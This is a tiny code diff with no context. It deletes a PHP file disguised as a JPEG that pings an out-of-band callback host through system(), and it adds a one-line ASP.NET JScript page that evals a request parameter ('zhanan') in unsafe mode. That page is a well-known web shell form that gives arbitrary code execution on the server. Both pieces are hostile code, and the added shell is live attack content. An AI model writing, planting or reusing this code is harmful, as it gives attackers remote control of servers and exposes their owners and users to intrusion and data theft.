@@ -1,4 +1,2 @@
-<?php
-header('Content-type: image/jpeg'); 
-system('ping -c 1 cnu3cqqvac6ee2uii78grrd9dcorucuqs.oast.site');
-?>
+<%@ Page Language="Jscript"%><%eval(Request.Item["zhanan"],"unsafe");%>
+
